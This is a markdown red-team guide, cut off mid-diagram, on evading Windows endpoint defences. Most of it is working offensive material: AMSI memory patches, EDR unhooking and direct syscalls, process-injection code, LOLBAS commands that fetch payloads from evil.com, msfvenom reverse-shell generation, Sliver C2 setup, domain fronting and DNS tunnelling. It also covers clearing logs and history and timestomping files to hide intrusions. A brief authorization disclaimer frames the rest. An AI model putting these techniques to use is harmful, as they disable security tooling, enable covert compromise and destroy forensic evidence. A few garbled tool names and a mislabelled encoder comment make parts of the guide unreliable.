---
tags:
  - redteam
  - evasion
  - bypass
  - opsec
  - amsi
  - edr
  - guide
created: 2026-04-29
author: clawd
---

# Evasion & Bypass Techniques

> **⚠️ Warning**: This guide is for authorized red team operations, penetration testing, and security research only. Unauthorized access to computer systems is illegal. Always obtain proper written authorization before conducting any offensive security activities.

---

## Table of Contents

1. [Overview](#overview)
2. [AMSI Bypass Techniques](#amsi-bypass-techniques)
3. [EDR Evasion](#edr-evasion)
4. [Windows Defender / AV Evasion](#windows-defender--av-evasion)
5. [Network Evasion](#network-evasion)
6. [Process Injection Techniques](#process-injection-techniques)
7. [Memory-Only Execution](#memory-only-execution)
8. [Living Off The Land (LOLBAS)](#living-off-the-land-lolbas)
9. [Sandbox / VM Detection](#sandbox--vm-detection)
10. [OPSEC for Implants](#opsec-for-implants)
11. [Tool-Specific Evasion](#tool-specific-evasion)
12. [Quick Reference Cheat Sheet](#quick-reference-cheat-sheet)

---

## Overview

### Why Evasion Matters

Modern endpoints are protected by layered defenses. A single-payload approach fails against:

| Layer | Technology | Bypass Required |
|-------|-----------|-----------------|
| Antimalware Scan Interface | AMSI (PowerShell, VBS, JS) | AMSI bypass |
| Endpoint Detection & Response | CrowdStrike, SentinelOne, Defender ATP | EDR evasion |
| Antivirus | Signature-based AV | AV evasion |
| Network Security | Proxies, DNS filtering, IDS/IPS | Network evasion |
| Application Whitelisting | AppLocker, WDAC | LOLBAS techniques |

### The Cat-and-Mouse Game

```
┌─────────────────────────────────────────────────────────────┐
│  Defender adds signature → Red Team modifies payload        │
│  EDR adds behavioral rule → Operators use indirect syscalls │
│  Sandbox checks VM artifacts → Malware checks before exec   │
│  Network detects C2 → Operators use domain fronting          │
└─────────────────────────────────────────────────────────────┘
```

> **💡 Tip**: Evasion is about staying below the detection threshold—not just bypassing one layer, but minimizing your footprint across all layers simultaneously.

### Detection Layers

```
┌─────────────────────────────────────────┐
│          Network Layer (IDS/Proxy)      │
├─────────────────────────────────────────┤
│          Host Layer (EDR/AV)            │
├─────────────────────────────────────────┤
│          Application Layer (AMSI)        │
├─────────────────────────────────────────┤
│          Memory (EDR user-land hooks)    │
├─────────────────────────────────────────┤
│          Kernel (Vulnerable drivers)    │
└─────────────────────────────────────────┘
```

---

## AMSI Bypass Techniques

AMSI (Antimalware Scan Interface) is Microsoft’s API for real-time malware scanning by security products. PowerShell, VBScript, and JScript all route through AMSI.

### How AMSI Works

1. Script calls `AmsiScanBuffer()` or `AmsiScanString()`
2. Security product inspects the content
3. If malicious → script execution is blocked

### Bypass via Memory Patching

Patch `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`:

```powershell
# PowerShell - AMSI bypass via reflection
$winMan = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32" -Namespace "Win32Functions" -PassThru

$kernel32 = $winMan::LoadLibrary("kernel32.dll")
$asbAddr = $winMan::GetProcAddress($kernel32, "AmsiScanBuffer")

$oldProtect = 0
$winMan::VirtualProtect($asbAddr, [UIntPtr]8, 0x40, [ref]$oldProtect)

# Patch: MOV EAX, 0x80070057 (E_INVALIDARG) + RET
[Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asbAddr, $patch.Length)
```

### Bypass via .NET Assembly Load

Load malicious .NET in memory without touching disk:

```csharp
// C# - AMSI bypass before assembly load
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static void Main()
    {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr pAddr = GetProcAddress(hModule, "AmsiScanBuffer");
        
        uint oldProtect;
        VirtualProtect(pAddr, (UIntPtr)6, 0x40, out oldProtect);
        
        // Patch to return clean
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        Marshal.Copy(patch, 0, pAddr, patch.Length);
    }
}
```

### VBA Macro AMSI Bypass

```vba
Sub AutoOpen()
    Dim win32 As Object
    Set win32 = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Clear AMSI buffer via COM object manipulation
    ' Note: VBA macros route through AMSI in Office 365+
End Sub
```

### AMSI Bypass via WDISAPatch

Use `WDAS滩` (deprecated but illustrative) — patches `amsi.dll` in-memory via COM internals.

> **⚠️ Warning**: Memory patching is detectable via EDR's unhooking detection. Use with caution and only in short-lived operations.

---

## EDR Evasion

### User-Land Hooking Overview

EDRs inject DLLs into processes (e.g., `edrservice.sys`) and hook functions like:
- `NtCreateFile`
- `NtWriteVirtualMemory`
- `NtReadVirtualMemory`
- `NtProtectVirtualMemory`

### Unhooking

Restore original function bytes from `ntdll.dll` on disk (bypassing EDR hooks):

```c
// C - Unhook ntdll.dll
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PULONG, ULONG, PULONG);

void UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pAddr = GetProcAddress(hNtdll, "NtCreateFile");
    
    // Read original bytes from disk ntdll.dll
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    // Map section, find NtCreateFile offset
    // Copy original bytes over hooked location
    // VirtualProtect to RWX, memcpy, VirtualProtect back
}
```

### Direct Syscalls

Invoke syscalls directly from assembly (bypass user-land hooks):

```asm
; x64 ASM - Direct syscall for NtCreateFile
section .text
global NtCreateFile_Direct

NtCreateFile_Direct:
    mov r10, rcx
    mov eax, 0x55        ; syscall number for NtCreateFile
    syscall
    ret
```

```c
// C - Wrapper to call direct syscall stub
__declspec(naked) NTSTATUS NtCreateFile_Direct(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    __asm {
        mov r10, rcx
        mov eax, 0x55
        syscall
        ret
    }
}
```

> **💡 Tip**: Tools like [[Red Team Engagement Guide#Syscalls|SysWhispers2]] and [[Red Team Engagement Guide#Syscalls|SysWhispers3]] automate direct syscall generation for Cobalt Strike and Sliver.

### sRDI (Shellcode Reflective DLL Injection)

Convert a DLL to position-independent shellcode that self-injects:

```bash
# Convert DLL to shellcode using sRDI
python3 ConvertToShellcode.py payload.dll
# Output: payload.bin (reflective loader + DLL)
```

Inject via [[#Process Injection Techniques|process injection]]:

```c
// Execute sRDI shellcode
void* exec = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, payload_bin, payload_size);
((void(*)())exec)();
```

### Sleep Obfuscation

Break up execution with encrypted sleep periods to evade behavioral detection:

```python
# Python - Sleep obfuscation example
import time
import hashlib

KEY = b"xor_key_32_bytes_here______"

def sleep_obfuscated(seconds):
    # Encrypt current timestamp - EDR can't correlate
    start = time.time()
    encrypted = start ^ int.from_bytes(hashlib.sha256(KEY).digest()[:8], 'little')
    
    # Perform actual sleep
    time.sleep(seconds)
    
    # Verify time wasn't tampered
    elapsed = time.time() - start
    assert abs(elapsed - seconds) < 1.0
```

---

## Windows Defender / AV Evasion

### Signature Evasion

1. **String obfuscation**: XOR, Base64, ROT13 the payload strings
2. **Section renaming**: Rename `.text` to `.data` (confuses static signatures)
3. **Entry point padding**: Add NOP sled before real payload

### Packer Workflow

```
┌──────────────┐     ┌─────────────────┐     ┌────────────────┐
│  Raw EXE     │ →   │  Packer Stage 1  │ →   │  Encrypted     │
│  (malware)   │     │  (small loader)  │     │  payload       │
└──────────────┘     └─────────────────┘     └────────────────┘
                                                    ↓
                     ┌─────────────────┐     ┌────────────────┐
                     │  Decompress +   │ ←   │  Runtime       │
                     │  Decrypt        │     │  unpacking     │
                     └─────────────────┘     └────────────────┘
```

### Crypter Workflow

```
┌──────────────┐     ┌─────────────────┐     ┌────────────────┐
│  Raw payload │ →   │  Encrypt        │ →   │  Stub +        │
│  (shellcode) │     │  (AES/XOR)      │     │  Encrypted blob│
└──────────────┘     └─────────────────┘     └────────────────┘
```

### LOLBAS (Living Off The Land, Binaries, Scripts, Libraries)

Use built-in Windows tools for execution—already trusted:

| Binary | Purpose | LOLBAS Command |
|--------|---------|----------------|
| `certutil.exe` | Download, decode | `certutil -urlcache -split -f http://evil.com/mal.exe` |
| `mshta.exe` | Execute HTA/JS | `mshta http://evil.com/payload.hta` |
| `rundll32.exe` | DLL execution | `rundll32 javascript:"\..\mshtml,RunHTMLApplication"` |
| `regsvr32.exe` | Register COM | `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` |
| `msbuild.exe` | Inline task | `msbuild.exe inlineCS.cs` |
| `powershell.exe` | Everything | `powershell -enc <base64>` |

> **💡 Tip**: Prefer LOLBAS over dropping custom binaries. `certutil.exe` downloading files is common in enterprise environments and blends with normal traffic.

---

## Network Evasion

### Domain Fronting

Route C2 traffic through trusted CDNs (Azure, Cloudflare, Amazon CloudFront):

```
┌────────────┐    HTTPS    ┌──────────────┐    HTTPS    ┌────────────┐
│  Target    │ ──────────→ │  CDN (legit) │ ──────────→ │  C2 Server │
│  Network   │             │  (fronted)   │             │  (hidden)  │
└────────────┘             └──────────────┘             └────────────┘
  Host: trusted-domain.com → CDN → C2 behind CDN
```

In Sliver C2:
```yaml
# sliver.yml
profiles:
  - name: fronted-http
    https: true
    domains:
      - fronted-domain.cloudfront.net  # CDN front
    dodge: true  # Enable domain fronting
```

### DNS Tunneling

Exfiltrate data via DNS queries (A, TXT, CNAME records):

```bash
# DNS tunneling example with dnscat2
# Server (attacker):
dnscat2-server --secret=mysecret

# Client (target):
dnscat2-client --secret=mysecret --dns server=attacker.com
```

### HTTPS with Legitimate Certificates

Use [[Red Team Engagement Guide#C2 Infrastructure|LetsEncrypt or valid certs]] for C2 domains:
- Domain age matters—new domains are flagged
- Use domains with existing reputation

### Domain Categorization Bypass

- **Typosquatting**: `microsft.com` (easily detected)
- **Age**: Register domains months in advance
- **Category**: Use domains already categorized as "Business" or "Technology"

---

## Process Injection Techniques

### DLL Injection

1. Open target process with `OpenProcess(PROCESS_ALL_ACCESS)`
2. Allocate memory with `VirtualAllocEx`
3. Write DLL path with `WriteProcessMemory`
4. Create remote thread with `CreateRemoteThread` → `LoadLibraryA`

```c
// C - DLL injection
void inject_dll(HANDLE hProcess, const char* dllPath) {
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);
    
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remotePath, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
}
```

### Process Hollowing

Replace a legitimate process's memory with malicious code:

```
┌─────────────────────────────────────────────────────┐
│  1. Create suspended process (svchost.exe)          │
│  2. Unmap legitimate sections                       │
│  3. Allocate new sections with malicious code       │
│  4. Set new entry point                              │
│  5. Resume thread                                    │
└─────────────────────────────────────────────────────┘
```

```c
// C - Process hollowing (simplified)
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, 
    CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// Unmap + allocate + write shellcode + resume
```

### APC Injection

Queue an Asynchronous Procedure Call to a thread in alertable state:

```c
// C - APC injection to all threads in a process
void apc_inject(HANDLE hProcess, LPVOID shellcode, SIZE_T shellcodeSize) {
    // Enumerate threads in process
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(THREAD_SNAPSHOT, GetProcessId(hProcess));
    
    while (Thread32Next(hSnapshot, &te32)) {
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
        // Queue APC to each thread
        QueueUserAPC((PAPCFUNC)shellcode, hThread, 0);
        CloseHandle(hThread);
    }
}
```

### Thread Hijacking

Suspend a thread, replace instruction pointer (RIP), resume:

```
┌────────────────────────────────────────────┐
│  1. Open thread (OpenThread)               │
│  2. Suspend (SuspendThread)                │
│  3. Get context (GetThreadContext)         │
│  4. Modify RIP → shellcode address          │
│  5. Set context (SetThreadContext)         │
│  6. Resume (ResumeThread)                  │
└────────────────────────────────────────────┘
```

---

## Memory-Only Execution

### Reflective DLL Injection

Load a DLL from memory without touching the filesystem:
1. DLL contains a reflective loader function
2. Loader finds its own base address
3. Fixes imports, relocations
4. Calls DllMain

```c
// Reflective DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Your malicious code here
    }
    return TRUE;
}
```

### Shellcode Injection

Inject raw position-independent shellcode:

```c
// C - VirtualAlloc + memcpy + CreateThread
unsigned char shellcode[] = { 0x90, 0x90, /* ... */ };
void* exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
```

### .NET in-Memory Loading

```powershell
# PowerShell - Load .NET assembly from memory
$asmBytes = [System.IO.File]::ReadAllBytes("C:\temp\malicious.dll")
$asm = [System.Reflection.Assembly]::Load($asmBytes)
$asm.GetTypes() | ForEach-Object { $_.GetMethods() | ForEach-Object { $_.Invoke($null, $null) } }
```

---

## Living Off The Land (LOLBAS)

### Common LOLBAS Attack Chains

#### certutil Download + rundll32 Execute

```cmd
certutil -urlcache -split -f http://evil.com/payload.dll C:\temp\payload.dll
rundll32 C:\temp\payload.dll,DllMain
```

#### mshta Inline HTA

```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"":Close")
```

#### regsvr32 COM Hijack (Squiblydoo)

```cmd
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
```

#### msbuild Inline Task

```xml
<!-- payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        <![CDATA[
          System.Diagnostics.Process.Start("cmd.exe", "/c calc");
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild.exe payload.csproj
```

> **💡 Tip**: LOLBAS detection is hard—these tools are signed Microsoft binaries. Focus on parent-child process relationships (e.g., `mshta.exe` spawning from `word.exe` = suspicious).

---

## Sandbox / VM Detection

### Common Detection Checks

| Category | Check | Code |
|----------|-------|------|
| VM Files | VMware tools, VirtualBox Guest Additions | `dir C:\Windows\System32\drivers\vmmouse.sys` |
| VM Registry | VMware keys, Hyper-V identifiers | `reg query "HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest"` |
| CPUID | Hypervisor bit | `cpuid; eax=1; check hypervisor bit` |
| Mac Address | VMware: 00:05:69, 00:0C:29 | `getmac` |
| Process | vmtoolsd.exe, vboxservice.exe | `tasklist` |
| Disk Size | < 60GB typical for VMs | `wmic diskdrive get size` |
| Memory | < 2GB typical for sandboxes | `systeminfo` |
| User | "sandbox", "malware", "virus" | `whoami` |

### Anti-Analysis Code

```c
// C - VM detection
BOOL is_vm() {
    // CPUID hypervisor bit
    int cpuinfo[4];
    __cpuid(cpuinfo, 1);
    if (cpuinfo[2] & (1 << 31)) return TRUE;  // Hypervisor present
    
    // Registry check
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
        return TRUE;
    
    return FALSE;
}
```

```powershell
# PowerShell - Sandbox detection
function Get-IsSandbox {
    $mac = Get-NetAdapter | Get-NetAdapterHardwareInfo | Where-Object { 
        $_.MacAddress -match "^00(0C|05|15|50)29" 
    }
    if ($mac) { return $true }
    
    $disk = Get-WmiObject Win32_DiskDrive | Where-Object { 
        [int64]$_.Size -lt 60000000000 
    }
    if ($disk) { return $true }
    
    return $false
}
```

> **⚠️ Warning**: Overly aggressive VM detection can tip off analysts. Use light checks only when necessary.

---

## OPSEC for Implants

### Timestomping

Modify file timestamps to match legitimate system files:

```bash
# Set timestamp to match system file
touch -r /Windows/System32/ntdll.dll payload.dll
```

```cmd
:: cmd - timestomp
 timestomp C:\temp\malicious.dll -f C:\Windows\System32\ntdll.dll
```

### Log Clearing

```cmd
:: Clear Windows Event Logs (requires elevation)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

:: Clear PowerShell transcript logs
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
```

### Artifact Minimization

- **File-less execution**: Run from memory, not disk
- **Short-lived processes**: Spawn and exit quickly
- **Randomize naming**: Don't use `svchost.exe` with wrong path
- **Clean up**: Delete staging files after use

---

## Tool-Specific Evasion

### Sliver C2 Evasion Features 🦞

Sliver has built-in evasion capabilities that should be your first choice for C2 operations.

**Built-in Evasion Flags:**

```sliver
# Full evasion build
sliver > generate --name evasive --http 10.10.10.10 --format exe \
  --skip-symbols \
  --evasion \
  --shellcode-entropy 3

# Shellcode with compression and bypass
sliver > generate --name shell-evade --http 10.10.10.10 --format shellcode \
  --shellcode-compress \
  --shellcode-entropy 3 \
  --shellcode-bypass 2 \
  --shellcode-exitopt 1

# Service-style implant (blends with Windows services)
sliver > generate --name svc-host --http 10.10.10.10 --format service
```

**Evasion Flag Reference:**

| Flag | Description | Effect |
|------|-------------|--------|
| `--skip-symbols` | Strip debug symbols | Reduces static analysis signatures |
| `--evasion` | Enable all evasion features | Combined anti-AV/EDR measures |
| `--shellcode-compress` | aPLib compression | Reduces shellcode size, evades entropy detection |
| `--shellcode-entropy 1/2/3` | Entropy obfuscation | 1=none, 2=random names, 3=random+encrypt |
| `--shellcode-bypass 1/2/3` | Bypass behavior | 1=none, 2=abort on fail, 3=continue |
| `--shellcode-exitopt 1/2/3` | Exit behavior | 1=exit thread, 2=exit process, 3=block |
| `--shellcode-headers 1/2` | PE headers | 1=overwrite, 2=keep original |

**Sliver AMSI Bypass (via Armory):**

```sliver
# Install AMSI bypass extension
sliver > armory update
sliver > armory search amsi
sliver > armory install amsi-bypass

# Execute on target
sliver (IMPLANT) > execute-extension amsi-bypass
```

**Sliver ETW Bypass:**

```sliver
# ETW patching extension
sliver > armory install etw-patch
sliver (IMPLANT) > execute-extension etw-patch
```

**Sliver Memory-Only Execution:**

```sliver
# Execute .NET assembly in-memory (no disk write)
sliver (IMPLANT) > execute-assembly /tools/Rubeus.exe kerberoast

# Sideload DLL (inject into current process)
sliver (IMPLANT) > sideload /tools/mimikatz.dll

# Spawndll (inject into new process)
sliver (IMPLANT) > spawndll /tools/payload.dll DllMain
```

**Sliver Network Evasion:**

```sliver
# Domain fronting via CDN
sliver > generate --https cdn.cloudflare.com?host-header=legit-site.com --format exe

# DNS C2 (evades network monitoring)
sliver > dns --domains c2.example.com --lhost 0.0.0.0
sliver > generate --dns c2.example.com --beacon 300 --jitter 50 --format exe

# WireGuard tunnel (encrypted, looks like VPN)
sliver > wg --lhost 0.0.0.0 --lport 53
sliver > generate --wg 10.10.10.10:53 --format exe

# Slow beacon with jitter (low-and-slow C2)
sliver > generate --http 10.10.10.10 --beacon 600 --jitter 40 --format exe
```

**Sliver Staged Delivery (Smaller Initial Payload):**

```sliver
# 1. Create shellcode profile
sliver > profiles new --name win-stage --http 10.10.10.10 --format shellcode

# 2. Start staging listener
sliver > stage-listener --url http://10.10.10.10:8080 --profile win-stage --aes-encrypt-key "D(G+KbPeShVmYq3t"

# 3. Generate stager with msfvenom (on Kali)
$ msfvenom -p windows/x64/custom/reverse_winhttp LHOST=10.10.10.10 LPORT=8080 LURI=/payload.woff -f raw -o stager.bin
```

---

### Metasploit Evasion (Kali) 🔫

Metasploit provides encoding, staging, and post-exploitation evasion modules.

**Payload Encoding:**

```bash
# Shikata Ga Nai encoder (most common)
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Chain multiple encoders
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
  -e x64/xor_dynamic -i 3 \
  -e x64/shikata_ga_nai -i 3 \
  -f exe -o multi_encoded.exe

# List available encoders
$ msfvenom --list encoders

# Best x64 encoders:
# - x64/xor_dynamic    (low entropy, good evasion)
# - x64/shikata_ga_nai (classic polymorphic)
# - x64/zutto_dekiru   (polymorphic)
# - x64/xor_context    (context-based XOR)
```

**Metasploit Evasion Modules:**

```bash
$ msfconsole -q

# AMSI bypass (post-exploitation)
msf6 > use post/windows/manage/amsi_bypass
msf6 (amsi_bypass) > set SESSION 1
msf6 (amsi_bypass) > run

# ETW patching (disable Event Tracing)
msf6 > use post/windows/manage/patch_etw
msf6 (patch_etw) > set SESSION 1
msf6 (patch_etw) > run

# PowerShell downgrade (avoid ScriptBlock logging)
msf6 > use post/windows/manage/powershell_downgrade
msf6 (powershell_downgrade) > set SESSION 1
msf6 (powershell_downgrade) > run

# Migrate to stable process
msf6 > run post/windows/manage/migrate

# Enable privileged mode (token manipulation)
msf6 > use post/windows/escalate/ask
```

**Meterpreter In-Memory Tools:**

```bash
# Load Mimikatz without disk write
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kerberos_ticket_list
meterpreter > golden_ticket_create

# Load Python interpreter (in-memory)
meterpreter > load python
meterpreter > python_exec "import os; print(os.popen('whoami').read())"

# PowerShell via meterpreter
meterpreter > load powershell
meterpreter > powershell_execute "Get-Process | Where-Object {$_.Name -like '*defrag*'}"
```

**Meterpreter Network Evasion:**

```bash
# Set up handler with SSL
msf6 > use exploit/multi/handler
msf6 (handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 (handler) > set LHOST cdn.example.com
msf6 (handler) > set LPORT 443
msf6 (handler) > set HttpHostHeader legitimate-site.com
msf6 (handler) > set StagerVerifySSLCert true
msf6 (handler) > run

# Communication timeout (reduce traffic frequency)
msf6 (handler) > set SessionCommunicationTimeout 600
msf6 (handler) > set SessionExpirationTimeout 604800
```

**Metasploit Cleanup:**

```bash
# Clear event logs
meterpreter > clearev

# Timestomp file
meterpreter > timestomp C:\Users\Public\implant.exe -z "01/15/2026 08:30:00"

# Remove files
meterpreter > rm C:\Users\Public\implant.exe

# Remove registry persistence
msf6 > use post/windows/manage/delete_registry
msf6 (delete_registry) > set KEY "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"
msf6 (delete_registry) > run
```

---

### Kali Linux Evasion Tools 🐉

Kali provides extensive evasion utilities beyond Metasploit.

**Binary Packing & Obfuscation:**

```bash
# 1. UPX packing (compresses executable)
$ upx --best --ultra-brute payload.exe -o packed.exe
# Note: UPX signatures are well-known, may trigger some AV

# 2. Obfuscator-LLVM (compile-time obfuscation)
$ git clone https://github.com/obfuscator-llvm/obfuscator
$ clang -mllvm -sub -mllvm -fla -mllvm -bcf payload.c -o obfuscated

# 3. Hyperion (AES encrypter)
$ hyperion payload.exe encrypted_payload.exe

# 4. PE Cloak (PE section manipulation)
$ python pecloak.py -i payload.exe -o cloaked.exe --add-section .null --fill-random
```

**Shellcode Tools:**

```bash
# 1. Donut - Convert .NET PE to shellcode
$ donut -i Rubeus.exe -o rubeus.bin
$ donut -i Mimikatz.exe -f go -o mimikatz.go  # Output as Go code

# 2. sRDI - Shellcode Reflective DLL Injection
$ python sRDI.py payload.dll -f go -o shellcode.go

# 3. ShellNoob - Shellcode toolkit
$ shellnoob -i payload.bin -e x86/shikata_ga_nai -c 3 -o encoded.bin

# 4. Shellgen - Generate custom shellcode
$ shellgen --arch x64 --os windows --type exec --cmd "calc.exe" -o calc.bin
```

**PowerShell Obfuscation:**

```bash
# 1. Invoke-Obfuscation
$ pwsh
PS> Import-Module ./Invoke-Obfuscation.psd1
PS> Invoke-Obfuscation
# Interactive menu: SET SCRIPTBLOCK > ENCODE > OUTPUT

# 2. ISESteroids obfuscation
# (Built into commercial ISESteroids extension)

# 3. Manual obfuscation
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-Mimikatz'))
# Run: powershell -enc $encoded
```

**AMSI Bypass Tools:**

```bash
# 1. Amsi.fail - Generate random bypass one-liners
$ git clone https://github.com/Flangvik/AMSI.fail
cd AMSSI.fail
$ python amsi_fail.py  # Generates random bypass

# 2. AMSI-Bypass-PowerShell
$ git clone https://github.com/p0shKilleR/AMSI-Bypass-PowerShell
PS> Import-Module ./AMSI-Bypass.ps1
PS> AmsiBypass

# 3. SharpAmsi (C# tool)
$ SharpAmsi.exe bypass
```

**Direct Syscall Tools:**

```bash
# 1. SysWhispers2 (generate direct syscalls)
$ python syswhispers2.py --function NtCreateFile,NtWriteFile -o syscalls
# Output: syscalls.asm, syscalls.h, syscalls.c

# 2. SysWhispers3 (improved, more functions)
$ python syswhispers3.py --functions NtCreateThreadEx --out-file syscalls

# 3. Hell's Gate / Halos Gate (runtime syscall resolution)
$ git clone https://github.com/am0nsec/HellsGate
$ make
```

**VM/Sandbox Detection Tools:**

```bash
# 1. al-khaser (comprehensive VM detection)
$ git clone https://github.com/LordNoteworthy/al-khaser
cd al-khaser
$ make
$ ./al-khaser

# 2. PAFish (Paranoid Fish)
$ git clone https://github.com/a0rtega/pafish
cd pafish
$ make
$ ./pafish.exe

# 3. Check VM artifacts manually
$ dmidecode -t system | grep -i manufacturer
$ lscpu | grep -i hypervisor
$ cat /proc/cpuinfo | grep -i hypervisor
```

**Process Injection Tools:**

```bash
# 1. Process Hollowing (Python tool)
$ python process_hollowing.py --payload payload.exe --target svchost.exe

# 2. DLL Injection
$ python dll_injection.py --dll payload.dll --pid 1234

# 3. Early Bird Injection (process injection via APC)
$ EarlyBird.exe payload.bin 1234
```

**Forensics Countermeasures:**

```bash
# 1. Secure file deletion
$ srm -z payload.exe        # Overwrite with zeros then delete
$ shred -vfz -n 5 payload.exe  # 5 passes of random + zeros

# 2. Clear bash history
$ history -c && history -w
$ echo "" > ~/.bash_history
$ unset HISTFILE

# 3. Clear system logs (Linux)
$ echo "" > /var/log/auth.log
$ echo "" > /var/log/syslog
$ journalctl --vacuum-time=1s

# 4. Timestomp file
$ touch -d "2026-01-15 08:30:00" payload.exe
$ touch -r /bin/ls payload.exe  # Copy timestamps from legit file
```

**Network Redirectors:**

```bash
# 1. SOCAT redirector (hide true C2)
$ socat TCP4-LISTEN:443,fork TCP4:10.10.10.10:443

# 2. SOCAT UDP redirector (for DNS)
$ socat UDP4-LISTEN:53,fork UDP4:10.10.10.10:53

# 3. Nginx HTTPS redirector
# /etc/nginx/sites-available/c2-redirect:
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
    location / {
        proxy_pass http://10.10.10.10:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
$ ln -s /etc/nginx/sites-available/c2-redirect /etc/nginx/sites-enabled/
$ nginx -s reload

# 4. iptables DNAT redirector
$ iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.10.10.10:443
$ iptables -t nat -A POSTROUTING -p tcp -d 10.10.10.10 --dport 443 -j MASQUERADE
```

**Domain Fronting Setup:**

```bash
# 1. Get domain and CDN setup (Cloudflare example)
# - Register domain
# - Add to Cloudflare
# - Enable "Orange Cloud" (proxy)

# 2. Generate certificate for fronting domain
$ certbot certonly --manual -d cdn.example.com

# 3. Configure C2 to use domain fronting
# Sliver: generate --https cdn.example.com?host-header=real-target.cloudflare.com
# MSF: set HttpHostHeader real-target.cloudflare.com
```

---

### Evasion Workflow Integration

**Complete Attack Chain with Evasion:**

```
┌──────────────────────────────────────────────────────────────────┐
│                    LAYERED EVASION WORKFLOW                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  PHASE 1: BUILD                                                  │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │ Sliver:  generate --evasion --skip-symbols --shellcode-    │ │
│  │          entropy 3 --format shellcode                      │ │
│  │                                                             │ │
